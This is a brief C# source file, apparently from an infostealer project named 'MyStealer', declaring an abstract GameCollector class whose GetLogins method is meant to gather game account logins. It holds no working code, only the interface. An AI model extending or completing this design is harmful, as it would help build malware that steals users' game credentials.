using System.Collections.Immutable;

namespace MyStealer.Collector.Game
{
    public abstract class GameCollector : ModuleBase
    {
        public abstract IImmutableSet<GameLogin> GetLogins();
    }
}
